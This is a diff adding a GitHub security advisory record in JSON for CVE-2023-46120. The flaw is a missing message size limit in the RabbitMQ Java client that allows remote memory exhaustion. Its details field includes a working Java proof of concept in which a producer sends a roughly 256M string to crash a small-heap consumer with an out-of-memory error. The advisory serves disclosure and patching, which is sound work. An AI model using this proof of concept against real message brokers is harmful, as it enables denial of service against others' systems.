@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-mm8h-8587-p46h",
+  "modified": "2023-10-27T20:47:02Z",
+  "published": "2023-10-24T01:49:09Z",
+  "aliases": [
+    "CVE-2023-46120"
+  ],
+  "summary": "RabbitMQ Java client's Lack of Message Size Limitation leads to Remote DoS Attack",
+  "details": "### Summary\n`maxBodyLebgth` was not used when receiving Message objects.  Attackers could just send a very large Message causing a memory overflow and triggering an OOM Error.\n\n### PoC\n#### RbbitMQ\n* Use RabbitMQ 3.11.16 as MQ and specify Message Body size 512M (here it only needs to be larger than the Consumer memory)\n* Start RabbitMQ\n#### Producer\n* Build a String of length 256M and send it to Consumer\n```\n\npackage org.springframework.amqp.helloworld; \n\nimport org.springframework.amqp.core.AmqpTemplate; \nimport org.springframework.context.ApplicationContext; \nimport org.springframework.context.annotation.AnnotationConfigApplicationContext; \n\npublic class Producer {\n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class); \n        String s = \"A\";\n        for(int i=0;i<28;++i){\n            s = s + s;\n            System.out.println(i);\n        }\n        amqpTemplate.convertAndSend(s);\n        System.out.println(\"Send Finish\");\n    }\n }\n```\n\n#### Consumer\n* First set the heap memory size to 128M\n* Read the message sent by the Producer from the MQ and print the length\n```\npackage org.springframework.amqp.helloworld;\n\nimport org.springframework.amqp.core.AmqpTemplate;\nimport org.springframework.amqp.core.Message;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic class Consumer {\n    \n    public static void main(String[] args) {\n        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);\n        Object o = amqpTemplate.receiveAndConvert();\n        if(o != null){\n            String s = o.toString();\n            System.out.println(\"Received Length : \" + s.length());\n        }else{\n            System.out.println(\"null\");\n        }\n    }\n}\n```\n#### Results\n* Run the Producer first, then the Consumer\n* Consumer throws OOM Exception\n\n\n### Impact\nUsers of RabbitMQ may suffer from  DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.rabbitmq:amqp-client"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.18.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46120"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/issues/1062"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-24T01:49:09Z",
+    "nvd_published_at": "2023-10-25T18:17:36Z"
+  }
+}
